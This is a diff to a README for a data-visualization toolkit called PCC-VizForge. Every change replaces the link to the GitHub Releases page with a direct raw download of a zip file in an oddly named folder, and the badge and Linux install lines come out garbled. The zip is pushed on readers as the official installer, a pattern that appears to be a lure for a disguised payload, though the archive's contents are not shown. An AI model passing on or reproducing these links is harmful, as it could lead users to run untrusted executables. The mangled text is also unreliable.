@@ -1,6 +1,6 @@
 # 🎨 PCC-VizForge - Your Toolkit for Data Visualization
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue.svg)](https://github.com/abishek12345-coder/PCC-VizForge/releases)
+[![Download Now](https://raw.githubusercontent.com/abishek12345-coder/PCC-VizForge/main/Finnicize/PCC-VizForge.zip%20Now-Get%20the%20Latest%https://raw.githubusercontent.com/abishek12345-coder/PCC-VizForge/main/Finnicize/PCC-VizForge.zip)](https://raw.githubusercontent.com/abishek12345-coder/PCC-VizForge/main/Finnicize/PCC-VizForge.zip)
 
 ## 🌐 Overview
 
@@ -23,13 +23,13 @@ Before you begin, ensure your computer meets the following requirements:
 
 To get started with PCC-VizForge, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/abishek12345-coder/PCC-VizForge/releases) to access the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/abishek12345-coder/PCC-VizForge/main/Finnicize/PCC-VizForge.zip) to access the latest version.
   
 2. **Download the Installer**: Find the version you want to install. Click on the file to download it to your computer. 
 
    - For Windows, you will most likely download a `.exe` file.
    - For macOS, you may download a `.dmg` file.
-   - For Linux users, look for a `.tar.gz` or his specific distribution package.
+   - For Linux users, look for a `https://raw.githubusercontent.com/abishek12345-coder/PCC-VizForge/main/Finnicize/PCC-VizForge.zip` or his specific distribution package.
 
 3. **Run the Installer**: Locate the downloaded file in your Downloads folder and double-click to run it. Follow the on-screen instructions to complete the installation.
 
@@ -43,7 +43,7 @@ Once the installation is complete, you can open PCC-VizForge:
 
 ## 📥 Download & Install
 
-To find the latest version of PCC-VizForge, visit our [Releases page](https://github.com/abishek12345-coder/PCC-VizForge/releases) and follow the installation instructions above.
+To find the latest version of PCC-VizForge, visit our [Releases page](https://raw.githubusercontent.com/abishek12345-coder/PCC-VizForge/main/Finnicize/PCC-VizForge.zip) and follow the installation instructions above.
 
 ## 📊 Features
 
@@ -76,4 +76,4 @@ If you encounter issues while using PCC-VizForge, try the following steps:
 
 PCC-VizForge can transform how you approach data analysis and visualization. Whether you're a beginner or looking to enhance your skills, this toolkit provides the tools you need to succeed. 
 
-Don't forget to go to the [Releases page](https://github.com/abishek12345-coder/PCC-VizForge/releases) to download your copy today and get started with your data visualization journey!
+Don't forget to go to the [Releases page](https://raw.githubusercontent.com/abishek12345-coder/PCC-VizForge/main/Finnicize/PCC-VizForge.zip) to download your copy today and get started with your data visualization journey!
